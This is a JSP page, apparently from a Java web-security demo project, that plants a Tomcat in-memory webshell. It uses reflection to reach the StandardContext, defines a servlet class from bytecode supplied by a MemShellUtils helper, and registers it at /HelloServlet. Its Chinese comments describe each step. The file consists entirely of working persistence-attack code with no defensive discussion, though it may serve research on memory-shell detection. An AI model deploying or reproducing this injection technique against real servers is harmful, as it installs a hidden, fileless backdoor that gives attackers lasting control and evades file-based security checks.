<%@ page contentType="text/html;charset=UTF-8" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="static org.javaweb.vuln.utils.MemShellUtils.createServletClass" %>
<%!
    Class<?> definedClass(ClassLoader classLoader, byte[] bytes) throws Exception {
        Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        method.setAccessible(true);

        return (Class<?>) method.invoke(classLoader, bytes, 0, bytes.length);
    }
%>

<%
    //    String servletName = request.getParameter("servletName");
    //    String servletPath = request.getParameter("servletPath");
    String servletName = "HelloServlet";
    String servletPath = "/HelloServlet";

    // org.apache.catalina.core.ApplicationContextFacade
    ServletContext servletContext = request.getServletContext();

    // 如果已有此 servletName 的 MemShellUtils，则不再重复添加
    if (servletContext.getServletRegistration(servletName) == null) {
        // 获取ApplicationContext
        Field contextField = servletContext.getClass().getDeclaredField("context");
        contextField.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) contextField.get(servletContext);

        // 获取StandardContext
        Field contextField2 = applicationContext.getClass().getDeclaredField("context");
        contextField2.setAccessible(true);
        StandardContext context = (StandardContext) contextField2.get(applicationContext);

        // 获取context类加载
        ClassLoader classLoader = context.getClass().getClassLoader();

        // 创建类字节码
        byte[] bytes = createServletClass(classLoader);

        // 创建类实例
        Class<?> servletClass = definedClass(classLoader, bytes);

        // 注册Servlet
        Wrapper wrapper = context.createWrapper();
        wrapper.setName(servletName);
        wrapper.setLoadOnStartup(1);
        wrapper.setServlet((Servlet) servletClass.newInstance());
        wrapper.setServletClass(servletClass.getName());
        context.addChild(wrapper);
        context.addServletMapping(servletPath, servletName);
    }

    out.println("MemShellUtils: " + servletName + ", servletPath: " + servletPath);
%>
